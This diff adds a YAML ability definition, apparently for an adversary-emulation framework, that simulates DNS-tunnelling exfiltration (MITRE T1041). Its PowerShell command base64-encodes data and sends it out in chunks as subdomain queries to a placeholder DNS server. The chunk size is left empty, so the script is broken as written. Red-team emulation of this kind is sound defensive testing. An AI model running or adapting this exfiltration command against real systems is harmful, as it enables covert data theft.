@@ -1,0 +1,24 @@
+- description: 'Simulates an adversary using DNS tunneling to exfiltrate data over
+    a Command and Control (C2) channel.
+
+    '
+  id: 82304a24-8a03-78a5-53b9-f6674126dba6
+  name: Text Based Data Exfiltration using DNS subdomains
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: $dnsServer = "#{dns_server}"; $exfiltratedData = "#{exfiltrated_data}";
+          $chunkSize =; $encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData);
+          $encodedData = [Convert]::ToBase64String($encodedData); $chunks = $encodedData
+          -split "(.{$chunkSize})"; foreach ($chunk in $chunks) {;     $dnsQuery =
+          $chunk + "." + $dnsServer;     Resolve-DnsName -Name $dnsQuery;     Start-Sleep
+          -Seconds 5; }
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: exfiltration
+  technique:
+    attack_id: T1041
+    name: Exfiltration Over C2 Channel
